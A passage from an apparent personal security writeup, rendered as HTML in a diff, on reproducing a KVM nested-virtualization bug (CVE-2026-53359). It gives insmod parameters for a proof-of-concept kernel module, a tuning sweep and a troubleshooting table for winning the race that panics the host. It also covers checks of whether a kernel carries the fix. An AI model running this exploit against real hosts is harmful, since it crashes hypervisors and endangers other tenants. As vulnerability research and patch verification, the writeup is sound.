+<span class="line"><span style="color:#6A737D"># more time</span></span>
+<span class="line"><span style="color:#B392F0">insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#9ECBFF"> nvcpu=</span><span style="color:#79B8FF">16</span><span style="color:#9ECBFF"> dwell=</span><span style="color:#79B8FF">1024</span><span style="color:#9ECBFF"> run_ms=</span><span style="color:#79B8FF">1800000</span></span></code></pre>
+<p>Diminishing returns — too large a <code>dwell</code> and the writer never completes a cycle.
+Sweep it:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#F97583">for</span><span style="color:#E1E4E8"> d </span><span style="color:#F97583">in</span><span style="color:#9ECBFF"> 64</span><span style="color:#9ECBFF"> 128</span><span style="color:#9ECBFF"> 256</span><span style="color:#9ECBFF"> 512</span><span style="color:#9ECBFF"> 1024</span><span style="color:#E1E4E8">; </span><span style="color:#F97583">do</span></span>
+<span class="line"><span style="color:#79B8FF">    echo</span><span style="color:#9ECBFF"> "=== dwell=</span><span style="color:#E1E4E8">$d</span><span style="color:#9ECBFF"> ==="</span></span>
+<span class="line"><span style="color:#B392F0">    insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#9ECBFF"> nvcpu=</span><span style="color:#79B8FF">16</span><span style="color:#9ECBFF"> dwell=</span><span style="color:#E1E4E8">$d </span><span style="color:#9ECBFF">run_ms=</span><span style="color:#79B8FF">600000</span></span>
+<span class="line"><span style="color:#B392F0">    sleep</span><span style="color:#79B8FF"> 5</span></span>
+<span class="line"><span style="color:#F97583">done</span></span></code></pre>
+<p><strong>More physical cores on L0 is a bigger lever than any parameter.</strong> The race is
+about parallelism. An under-provisioned shared 2-4 vCPU cloud instance is the most
+common reason the PoC “does nothing.”</p>
+<h3 id="amd-specifics">AMD specifics</h3>
+<p><code>nflood</code> is forced to 0 on AMD — the flood threads are Intel-only:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#FFAB70">role_of</span><span style="color:#E1E4E8">[cpu] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (cpu </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">)           </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> R_WRITER </span><span style="color:#F97583">:</span></span>
+<span class="line"><span style="color:#E1E4E8">               (cpu </span><span style="color:#F97583">&#x3C;=</span><span style="color:#E1E4E8"> nflood </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#F97583"> !</span><span style="color:#E1E4E8">amd) </span><span style="color:#F97583">?</span><span style="color:#E1E4E8"> R_FLOOD </span><span style="color:#F97583">:</span><span style="color:#E1E4E8"> R_FAULT;</span></span></code></pre>
+<p>Passing <code>nflood</code> on AMD gives you plain faulters, not a crash. Not a setup bug. The
+researcher notes the AMD-specific <em>full escape</em> is empirically a little easier,
+though the DoS is identical on both.</p>
+<h3 id="verbose-diagnostics">Verbose diagnostics</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">insmod</span><span style="color:#9ECBFF"> poc.ko</span><span style="color:#9ECBFF"> diag=</span><span style="color:#79B8FF">2</span></span></code></pre>
+<p>On AMD this prints the first VM-exit plus a running histogram, and watches for the
+probe page’s canary:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>poc[SVM]: first vmexit cpu0 exit_code=0x... info1=... info2=... rip=... rax=... (NPF=0x400 VMMCALL=0x81 HLT=0x78 ERR=0xffffffff)</span></span>
+<span class="line"><span>poc[SVM] hist cpu0: vmmcall=... npf=... hlt=... ERR=... other=... saw_4141=... nest_pd[4]=...</span></span>
+<span class="line"><span>poc[SVM]: cpu0 rip=... rax=0x4141..</span></span></code></pre>
+<p><code>rax=0x4141...</code> is the strongest <strong>positive</strong> signal short of the panic: L2
+actually executed the load against the <code>q</code> probe page (filled with <code>0x41</code>) that
+<code>ptg[PRIME_IDX]</code> points at. Never seeing it means the nested guest isn’t running L2
+code as expected.</p>
+<p>Exit-code legend the PoC itself uses: <code>0x81</code> VMMCALL, <code>0x400</code> NPF, <code>0x78</code> HLT,
+<code>0xffffffff</code> error.</p>
+<hr>
+<h2 id="step-5--confirming-the-fix">Step 5 — confirming the fix</h2>
+<h3 id="source-check-authoritative">Source check (authoritative)</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># On L0</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> grep</span><span style="color:#79B8FF"> -n</span><span style="color:#79B8FF"> -A14</span><span style="color:#9ECBFF"> "kvm_mmu_get_child_sp(struct kvm_vcpu"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  /lib/modules/</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -r</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">/build/arch/x86/kvm/mmu/mmu.c</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> head</span><span style="color:#79B8FF"> -30</span></span></code></pre>
+<p>Vulnerable:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">	if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">is_shadow_present_pte</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#F97583"> !</span><span style="color:#B392F0">is_large_pte</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span></span>
+<span class="line"><span style="color:#B392F0">	    spte_to_child_sp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#B392F0"> spte_to_child_sp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">gfn </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> gfn)</span></span>
+<span class="line"><span style="color:#F97583">		return</span><span style="color:#B392F0"> ERR_PTR</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">EEXIST);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">	role </span><span style="color:#F97583">=</span><span style="color:#B392F0"> kvm_mmu_child_role</span><span style="color:#E1E4E8">(sptep, direct, access);</span></span></code></pre>
+<p>Fixed — note <code>role.word == role.word</code> and the hoisted <code>role</code> init:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#F97583">	union</span><span style="color:#E1E4E8"> kvm_mmu_page_role role </span><span style="color:#F97583">=</span><span style="color:#B392F0"> kvm_mmu_child_role</span><span style="color:#E1E4E8">(sptep, direct, access);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">	if</span><span style="color:#E1E4E8"> (</span><span style="color:#B392F0">is_shadow_present_pte</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span></span>
+<span class="line"><span style="color:#F97583">	    !</span><span style="color:#B392F0">is_large_pte</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span></span>
+<span class="line"><span style="color:#B392F0">	    spte_to_child_sp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">&#x26;&#x26;</span></span>
+<span class="line"><span style="color:#B392F0">	    spte_to_child_sp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">gfn </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> gfn </span><span style="color:#F97583">&#x26;&#x26;</span></span>
+<span class="line"><span style="color:#B392F0">	    spte_to_child_sp</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">*</span><span style="color:#FFAB70">sptep</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">role.word </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> role.word)</span></span>
+<span class="line"><span style="color:#F97583">		return</span><span style="color:#B392F0"> ERR_PTR</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">-</span><span style="color:#E1E4E8">EEXIST);</span></span></code></pre>
+<p>One-liner verdict:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> grep</span><span style="color:#79B8FF"> -q</span><span style="color:#9ECBFF"> "role.word == role.word"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  /lib/modules/</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">uname</span><span style="color:#79B8FF"> -r</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">/build/arch/x86/kvm/mmu/mmu.c</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#E1E4E8">  &#x26;&#x26; </span><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "PATCHED"</span><span style="color:#F97583"> ||</span><span style="color:#79B8FF"> echo</span><span style="color:#9ECBFF"> "VULNERABLE (or headers unavailable)"</span></span></code></pre>
+<h3 id="backport-check">Backport check</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> /usr/src/linux</span><span style="color:#6A737D">   # or your stable clone</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> log</span><span style="color:#79B8FF"> --oneline</span><span style="color:#79B8FF"> --all</span><span style="color:#79B8FF"> --grep=</span><span style="color:#9ECBFF">"unexpected role"</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> head</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> branch</span><span style="color:#79B8FF"> -a</span><span style="color:#79B8FF"> --contains</span><span style="color:#9ECBFF"> 81ccda30b4e8</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span></code></pre>
+<h3 id="version-heuristic">Version heuristic</h3>
+<p><code>>= 7.2</code> carries the fix in-tree. Everything from 2.6.36 to 7.1 is in-window
+unless a backport landed. 7.0.y, 5.15.y and 5.10.y will never get it — 7.0.y is
+EOL, and the pre-6.0 trees don’t contain the patched function at all.</p>
+<p>RHEL-family kernels backport without moving the base version, so the version
+string lies. Check the erratum: RHSA-2026:36956 (EL10), :36957 (EL9), :39083 (EL8).</p>
+<h3 id="the-patched-behaviour-test">The patched-behaviour test</h3>
+<p>Load the PoC against a patched L0. Expected: the race runs to its <code>run_ms</code> deadline
+and logs <code>writer deadline ... -> stop</code> with <strong>no</strong> panic. The role comparison makes
+<code>kvm_mmu_get_child_sp</code> fall through to <code>kvm_mmu_get_shadow_page(vcpu, gfn, role)</code>,
+rmap keys never diverge, and <code>pte_list_remove</code> finds its entry.</p>
+<p>Weak evidence only — it could also be a lost race. Confirm by source.</p>
+<hr>
+<h2 id="troubleshooting">Troubleshooting</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Cause</th><th>Fix</th></tr></thead><tbody><tr><td><code>poc: CPU lacks VMX -> abort</code></td><td>L1 launched without VMX/SVM</td><td><code>-cpu host,vmx=on</code>; libvirt <code>host-passthrough</code> + <code>&#x3C;kvm>&#x3C;hidden state='on'/>&#x3C;/kvm></code></td></tr><tr><td><code>rmmod kvm_intel: Module is in use</code></td><td>A KVM guest is running inside L1</td><td><code>virsh destroy</code> / kill the nested qemu</td></tr><tr><td><code>vmxon fail cpu0</code></td><td>CR4.VMX unusable, or <code>kvm_intel</code> still loaded</td><td>Confirm <code>rmmod</code> succeeded; re-check nested=1 on L0</td></tr><tr><td><code>vmclear/ptrld fail cpu0</code></td><td>VMCS region not 4K-aligned or bad revision</td><td>Ensure enough guest RAM; check for a corrupted build</td></tr><tr><td><code>NO EPT ctl cpu0</code></td><td>EPT not exposed to L1</td><td>Confirm <code>kvm-intel.ept=1</code>; add explicit <code>vmx=on</code></td></tr><tr><td><code>run_guest RETURNED early vmerr=...</code></td><td>Launch failed; <code>vmerr</code> = VM-instruction error, <code>exit</code> = exit reason</td><td>Decode both; usually feature-control or CR0/CR4 masking</td></tr><tr><td>Race never wins, deadline hit</td><td>Too few cores, or <code>nvcpu</code> &#x3C; online CPUs</td><td>More L0 cores; <code>nvcpu=16</code>, <code>dwell=512</code></td></tr><tr><td><code>saw_4141</code> never set (diag=2)</td><td>L2 isn’t executing the load</td><td>Check <code>nest_pd[4]</code> in the histogram; verify the L2 image built</td></tr><tr><td>Crash on L1 instead of L0</td><td>Out of nested levels</td><td>L0 itself must be virtualized, with nested enabled at both levels</td></tr><tr><td>Immediate crash at insmod</td><td>Something else is broken on L0</td><td>Not this bug — check L0’s <code>dmesg</code> before/after</td></tr><tr><td><code>nflood</code> seems ignored</td><td>AMD path forces it to 0</td><td>Expected; flood is Intel-only</td></tr><tr><td>Module won’t load at all</td><td>Headers/build mismatch</td><td><code>uname -r</code> vs <code>linux-headers-$(uname -r)</code>; <code>dmesg | tail</code></td></tr></tbody></table>
+<hr>
+<h2 id="capturing-results">Capturing results</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># On L0, before running</span></span>
+<span class="line"><span style="color:#B392F0">sudo</span><span style="color:#9ECBFF"> dmesg</span><span style="color:#79B8FF"> -w</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> /tmp/l0-dmesg.txt</span><span style="color:#F97583"> 2>&#x26;1</span><span style="color:#E1E4E8"> &#x26;</span></span>
+<span class="line"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> $!</span><span style="color:#F97583"> ></span><span style="color:#9ECBFF"> /tmp/dmesg.pid</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># ... run the PoC in L1 ...</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D"># after the panic</span></span>
+<span class="line"><span style="color:#79B8FF">kill</span><span style="color:#9ECBFF"> "$(</span><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> /tmp/dmesg.pid)"</span><span style="color:#F97583"> 2></span><span style="color:#9ECBFF">/dev/null</span></span>
+<span class="line"><span style="color:#B392F0">grep</span><span style="color:#79B8FF"> -E</span><span style="color:#9ECBFF"> "gfn mismatch|kernel BUG|pte_list_remove|kvm_mmu_page_set_translation"</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">    /tmp/l0-dmesg.txt</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> tee</span><span style="color:#9ECBFF"> panic-</span><span style="color:#E1E4E8">$(</span><span style="color:#B392F0">date</span><span style="color:#9ECBFF"> +%F</span><span style="color:#E1E4E8">)</span><span style="color:#9ECBFF">.txt</span></span></code></pre>
+<p>Capture L1’s <code>dmesg</code> too. The <code>world built root=... S.gfn=... prime_gfn=... q_gfn=...</code> line proves the intended geometry was built, and without it a null
+result is uninterpretable.</p>
+<p>If you publish results, pin the commit SHA you tested against and record the
+embargo lift date (2026-07-06), so readers can tell exactly which PoC revision your
+results correspond to.</p>
+<hr>
+<h2 id="cleanup">Cleanup</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D"># In L1</span></span>
+<span class="line"><span style="color:#B392F0">rmmod</span><span style="color:#9ECBFF"> poc</span></span>
+<span class="line"><span style="color:#B392F0">modprobe</span><span style="color:#9ECBFF"> kvm_intel</span><span style="color:#6A737D">        # reload if you need KVM back</span></span>
+<span class="line"><span style="color:#B392F0">lsmod</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> grep</span><span style="color:#79B8FF"> -E</span><span style="color:#9ECBFF"> '^kvm_(intel|amd)'</span></span></code></pre>
+<p><strong>On L0, after a successful repro: rotate anything that lived on that host.</strong> You
+crashed it; you don’t know what else touched it. Check that the L0 kernel carries
+<code>81ccda30b4e8</code> before returning it to service — or better, rebuild.</p>
+<hr>
+<h2 id="references">References</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>What</th><th>Where</th></tr></thead><tbody><tr><td>Root-cause analysis (companion)</td><td><a href="https://github.com/V4bel/Januscape">https://github.com/V4bel/Januscape</a></td></tr><tr><td>oss-security post</td><td><a href="https://www.openwall.com/lists/oss-security/2026/07/06/7">https://www.openwall.com/lists/oss-security/2026/07/06/7</a></td></tr><tr><td>Fix commit</td><td><a href="https://github.com/torvalds/linux/commit/81ccda30b4e83d8f5cc4fd50503c44e3a33abfeb">https://github.com/torvalds/linux/commit/81ccda30b4e83d8f5cc4fd50503c44e3a33abfeb</a></td></tr><tr><td>Patch-status tracker</td><td><a href="https://github.com/suominen/januscape">https://github.com/suominen/januscape</a></td></tr><tr><td>Canonical mitigations</td><td><a href="https://canonical.com/blog/januscape-linux-vulnerability-mitigations-available">https://canonical.com/blog/januscape-linux-vulnerability-mitigations-available</a></td></tr><tr><td>Debian security tracker</td><td><a href="https://security-tracker.debian.org/tracker/CVE-2026-53359">https://security-tracker.debian.org/tracker/CVE-2026-53359</a></td></tr></tbody></table></div> <nav class="article-footer" aria-label="Writeup navigation"> <a class="back-link font-mono" href="/writeups/">← back to writeups</a> </nav> </article>  </main> <footer class="site-footer"> <div class="footer-inner"> <p class="footer-line"> <span class="prompt" aria-hidden="true">$</span> whoami
+<span class="dim">→ Feizal Said · Nairobi, Kenya</span> </p> <ul class="footer-links" aria-label="Social links"> <li><a href="https://github.com/feizalsaid" target="_blank" rel="noopener noreferrer">GitHub</a></li><li><a href="https://www.linkedin.com/in/feizalsaid" target="_blank" rel="noopener noreferrer">LinkedIn</a></li><li><a href="https://app.hackthebox.com/users/1941706" target="_blank" rel="noopener noreferrer">Hack The Box</a></li><li><a href="mailto:feizalsaid9@gmail.com" target="_blank" rel="noopener noreferrer">Email</a></li> </ul> <p class="copy">&copy; 2026 Feizal Said. Built with Astro.</p> </div> </footer>  </div> <!-- Cloudflare Web Analytics --><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;2ba77651b5984680a6fb4eac0950315e&quot;}"></script><!-- End Cloudflare Web Analytics --> </body></html> 
